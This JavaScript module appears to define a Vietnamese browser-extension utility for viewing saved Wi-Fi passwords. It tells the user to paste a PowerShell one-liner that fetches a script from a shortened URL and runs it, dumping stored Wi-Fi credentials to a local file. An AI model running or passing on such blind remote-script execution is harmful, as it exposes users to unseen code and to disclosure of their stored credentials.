export default {
  icon: '<i class="fa-solid fa-wifi"></i>',
  name: {
    en: "View saved wifi passwords",
    vi: "Xem mật khẩu wifi đã lưu",
  },
  description: {
    en: "PowerShell script to view saved wifi passwords on your computer",
    vi: "Powershell script giúp xem mật khẩu wifi đã lưu trên máy tính",
  },
  infoLink:
    "https://www.facebook.com/groups/j2team.community/posts/2328915024107271/",

  onClickExtension: () => {
    prompt(
      `File danh sách mật khẩu Wifi sẽ lưu ở:
"C:\\WifiPasswords\\listWifiPasswords.txt"
có dạng: [Tên Wifi]:[Mật khẩu]

Mở Powershell và chạy lệnh sau:`,
      `irm https://tinyurl.com/GetListWifiPasswords | iex`
    );
  },
};
